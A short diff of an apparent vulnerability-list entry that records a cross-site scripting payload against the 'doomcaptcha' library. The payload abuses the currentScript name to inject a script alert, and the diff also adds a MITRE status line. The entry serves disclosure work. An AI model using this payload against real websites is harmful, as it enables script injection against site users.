@@ -5,9 +5,10 @@
 + Library: doomcaptcha
 + Stars: 1K
 + Version: latest
-+ Payload: ```<img name=currentScript label="<script>alert(1)</script>"></img>```
++ Payload: ```<img name="currentScript" label="<script>alert(1)</script>"></img>```
 + Impact: XSS
 + CVE: N/A
++ Status: Mitre
 + Foundby: TheHulk
 + TheThing: Flow
 
